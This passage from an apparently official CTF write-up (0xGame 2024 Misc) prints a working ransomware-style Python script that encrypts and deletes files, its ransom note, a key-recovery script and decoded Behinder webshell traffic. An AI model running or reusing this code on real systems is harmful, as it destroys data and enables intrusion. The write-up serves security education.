aria-hidden="true">img</figcaption></figure><p>从拆解出的文件中找到summer.pyc，使用uncompyle6（pipinstall下载）对其进行反编译，得到python代码。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805643130-57f10e22-f8a5-4c83-8954-745771b854af.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>正如在题目描述中所说，这里为了师傅们电脑的安全性，删除了文件加密和原文件删除的相关代码，但是这并不影响做题，接下来在这里贴出未删减版：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> fnmatch</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> k3y,readme</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params"><span class="built_in">dir</span>=<span class="string">&#x27;.&#x27;</span>, ext=[<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;.7z&#x27;</span>, <span class="string">&#x27;.rar&#x27;</span>, <span class="string">&#x27;.gz&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;.bmp&#x27;</span>, <span class="string">&#x27;.gif&#x27;</span>, <span class="string">&#x27;.mp3&#x27;</span>, <span class="string">&#x27;.wav&#x27;</span>, <span class="string">&#x27;.avi&#x27;</span>, <span class="string">&#x27;.doc&#x27;</span>, <span class="string">&#x27;.docx&#x27;</span>, <span class="string">&#x27;.xls&#x27;</span>, <span class="string">&#x27;.xlsx&#x27;</span>, <span class="string">&#x27;.pdf&#x27;</span>, <span class="string">&#x27;.ppt&#x27;</span>, <span class="string">&#x27;.pptx&#x27;</span>, <span class="string">&#x27;.mp4&#x27;</span>, <span class="string">&#x27;.mov&#x27;</span>, <span class="string">&#x27;.flv&#x27;</span>, <span class="string">&#x27;.mkv&#x27;</span>, <span class="string">&#x27;.swf&#x27;</span>, <span class="string">&#x27;.dll&#x27;</span>, <span class="string">&#x27;.sys&#x27;</span>, <span class="string">&#x27;.iso&#x27;</span>, <span class="string">&#x27;.vmdk&#x27;</span>, <span class="string">&#x27;.vhd&#x27;</span>, <span class="string">&#x27;.vhdx&#x27;</span>, <span class="string">&#x27;.ova&#x27;</span>,]</span>):</span><br><span class="line">    ff = []</span><br><span class="line">    <span class="keyword">for</span> ro, di, fi <span class="keyword">in</span> os.walk(<span class="built_in">dir</span>):</span><br><span class="line">        <span class="keyword">for</span> ex <span class="keyword">in</span> ext:</span><br><span class="line">            <span class="keyword">for</span> na <span class="keyword">in</span> fnmatch.<span class="built_in">filter</span>(fi, <span class="string">&#x27;*&#x27;</span> + ex):</span><br><span class="line">                fp = os.path.join(ro, na)</span><br><span class="line">                ff.append(fp)</span><br><span class="line">    <span class="keyword">return</span> ff</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    cipher = DES3.new(key, DES3.MODE_ECB)</span><br><span class="line">    padded_plaintext = pad(plaintext, DES3.block_size)</span><br><span class="line">    ciphertext = cipher.encrypt(padded_plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">m</span>):</span><br><span class="line">    p=getPrime(<span class="number">256</span>)</span><br><span class="line">    q=getPrime(<span class="number">256</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    m1 = bytes_to_long(m)</span><br><span class="line">    c = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">    <span class="keyword">return</span> (n,c)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">txt,m</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Oops!.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(txt+<span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line">        f.write(base64.b64encode((<span class="built_in">str</span>(m[<span class="number">0</span>].bit_length())+<span class="built_in">str</span>(m[<span class="number">0</span>])+<span class="built_in">str</span>(m[<span class="number">1</span>].bit_length())+<span class="built_in">str</span>(m[<span class="number">1</span>])).encode()).decode())</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    fl = f()</span><br><span class="line">    <span class="keyword">for</span> fi <span class="keyword">in</span> fl:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fi, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        os.remove(fi)</span><br><span class="line">        data = encrypt1(k3y, data)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(fi+<span class="string">&#x27;.encrypted&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(data)</span><br><span class="line">    msg=encrypt2(k3y)</span><br><span class="line">    release(readme,msg)</span><br></pre></td></tr></table></figure><p>这里的代码明显是出题人自己手搓的，所以网上是没法找到用于解密的程序的。</p><p>接下来阅读一下代码的逻辑，可以看出大概是这样一个过程：查找当前目录下一些特定后缀名的文件--&gt;读取文件内容--&gt;删除原文件--&gt;对文件内容进行3DES加密--&gt;将内容写进一个新的文件，文件名为原文件名加上.encrypted--&gt;对前面一步中3DES时使用的密钥进行RSA加密，并且将RSA使用的n和加密后的密文以特定格式拼接后进行base64编码，以特定格式写入一同释放的文本中。</p><p>文本在附件中已经给出，就是Oops!.txt，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hello, w8nn9z! </span><br><span class="line">Your file has been encrypted! </span><br><span class="line">I have to inform you that due to my special encryption algorithm, all important files on your computer have been encrypted! This means that without a special key provided by me, you will not be able to access these files. </span><br><span class="line">To recover your files, you must follow the following steps: </span><br><span class="line">1. Pay the equivalent of $50 in Bitcoin to the designated Bitcoin address before the next Crazy Thursday. :) </span><br><span class="line">2. After payment is completed, please send the transaction ID and the string at the end of this file via email to st4rr@example.com . </span><br><span class="line">3. After receiving your payment confirmation, I will provide you with the key and the instruction on how to use it. </span><br><span class="line">If payment is not received within 72 hours, the price of the decryption instruction will double. In addition, if you attempt to recover data on your own or do not follow instructions, your files may be permanently deleted. :( </span><br><span class="line">Warning: Do not attempt to unlock files or use third-party tools on your own, as this may result in irreversible data loss. Similarly, any cooperation with law enforcement agencies will result in the destruction of keys, making it impossible to recover files. :( </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTExNjYyMjMyMDc3MDI1MjcxMzk4MzA0OTUyNTUzODUyOTQ0MjM5OTgwNjM5OTExNDYwMTE1NjA0MjQ3OTE2MjU1NjUwMTc0MzAyNTU0NjMwMTk4MjEzMTAxMzk3MDQzMDk0OTYxMjc1OTQ5ODkwOTUwODg5NDM1NDM2ODg2Nzk1OTQwNzYzODY0MjI3MjUzNTQ0MDc2NzUxMTkzMzUwOTE0NjMzOTUyOTEzNTQ0MTQwMzMyNDE4NjYyMjczNzEyNTQ3OTA4OTgxNTY1MzUxNDEzNjU3NTUzMzYxNDcxNjQzOTIwMzc4ODQwOTk2NDI4NDgyMTI3MDEwNTAzMDI2MDY3NTg3MzkyMDAwMDMwNDY1Mzc3MjAzNDQzNTk3MDI3MTE4OTA3MTE2OTE1MTAyODkwOTcwNDYzNzI=</span><br></pre></td></tr></table></figure><p>最后的一行base64编码显然就是解密用的关键信息。</p><p>需要说明的是，这里用上面的方法去逆向secret.pyc会发现，我们要找的密钥是随机生成的，没法直接得到。secret.py的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line">k3y=<span class="string">b&#x27;Summer&#x27;</span>+get_random_bytes(<span class="number">18</span>)</span><br><span class="line">readme=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hello, w8nn9z! </span></span><br><span class="line"><span class="string">Your file has been encrypted! </span></span><br><span class="line"><span class="string">I have to inform you that due to my special encryption algorithm, all important files on your computer have been encrypted! This means that without a special key provided by me, you will not be able to access these files. </span></span><br><span class="line"><span class="string">To recover your files, you must follow the following steps: </span></span><br><span class="line"><span class="string">1. Pay the equivalent of $50 in Bitcoin to the designated Bitcoin address before the next Crazy Thursday. :) </span></span><br><span class="line"><span class="string">2. After payment is completed, please send the transaction ID and the string at the end of this file via email to st4rr@example.com . </span></span><br><span class="line"><span class="string">3. After receiving your payment confirmation, I will provide you with the key and the instruction on how to use it. </span></span><br><span class="line"><span class="string">If payment is not received within 72 hours, the price of the decryption instruction will double. In addition, if you attempt to recover data on your own or do not follow instructions, your files may be permanently deleted. :( </span></span><br><span class="line"><span class="string">Warning: Do not attempt to unlock files or use third-party tools on your own, as this may result in irreversible data loss. Similarly, any cooperation with law enforcement agencies will result in the destruction of keys, making it impossible to recover files. :( </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>那么来看下怎么分析这串base64编码，当然首先是解码，得到一串数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">51166223207702527139830495255385294423998063991146011560424791625565017430255463019821310139704309496127594989095088943543688679594076386422725354407675119335091463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span><br></pre></td></tr></table></figure><p>通过分析代码得到，这串数字的格式是n的二进制长度+n+c的二进制长度+c，因此不难进行如下分段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">511</span><br><span class="line">6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933</span><br><span class="line">509</span><br><span class="line">1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span><br></pre></td></tr></table></figure><p>使用factordb分解一下n，这里在出题时已经提前将p和q提交到了factordb</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805643080-39b31174-8565-4689-b2a2-3d634db908e8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>RSA应该不必多说了，网上能找到很多教程，接下来写个脚本解密附件中的autumn.wav.encrypted</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line">p=<span class="number">64816076191920076931967680257669007967886202806676552562757735711115285212307</span></span><br><span class="line">q=<span class="number">102170960652478489355215071707263191814765888101601364955857801471459364198319</span></span><br><span class="line">n=<span class="number">6622320770252713983049525538529442399806399114601156042479162556501743025546301982131013970430949612759498909508894354368867959407638642272535440767511933</span></span><br><span class="line">c=<span class="number">1463395291354414033241866227371254790898156535141365755336147164392037884099642848212701050302606758739200003046537720344359702711890711691510289097046372</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">key=long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;autumn.wav.encrypted&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext=f.read().strip()</span><br><span class="line">    cipher = DES3.new(key, DES3.MODE_ECB)</span><br><span class="line">    padded_plaintext = cipher.decrypt(ciphertext)</span><br><span class="line">    plaintext = unpad(padded_plaintext, DES3.block_size)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;autumn.wav&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(plaintext)</span><br></pre></td></tr></table></figure><p>这样就成功得到了autumn.wav。先用010editor看一下，在文件末尾可以发现一串暂时不知道干什么用的密码</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805643689-fc26364f-d01e-4a5c-aa1e-3edf7a1b967a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里是存在deepsound的隐写，其实有些师傅看了hint就知道了。这里需要将deepsound更新到较新的版本才能提取出来。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805643666-bea466c6-53da-43bc-bb04-649c47c63c9b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打开winter.txt，里面看似什么都没有，但实际上有很多空格，这个是snow隐写</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805643630-c9c92b28-926c-4060-a0b6-13ae8a9e0f1d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用前面在010中得到密码提取，得到flag</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805643731-98dce7bb-e92a-45de-90b2-fc02986d94b9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="encrypted-file">Encrypted file</h3><p>附件给了一个 <code>secret.php</code> 和一个<code>Behinder.pcapng</code>，php打开是乱码还不知道有什么用先放一边，先分析流量包，搜搜文件名就大概可以知道是冰蝎流量，网上有很多资料可以参考</p><p>流量前面一大段都是用<code>dirsearch</code>在扫目录，可以发现攻击者找到一个<code>upload.php</code>，之后就是经典的冰蝎流量分析：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805644244-3435aa47-cc8c-47c9-a80e-da9e4e18f585.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上传的 <code>shell.php</code>的作用是对后续的攻击命令进行解密并执行，可以直接用于解密流量里的攻击命令，第一段和第二段分别是在进行密钥协商和返回phpinfo()的命令回显，可以直接从第三段开始往后进行分析</p><p>以第三段为例，直接用流量里的 <code>shell.php</code> 进行解密：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Decrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$after</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$after</span>[<span class="variable">$i</span>] = <span class="variable">$after</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;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&quot;</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">Decrypt</span>(<span class="variable">$shell</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果即执行的命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span 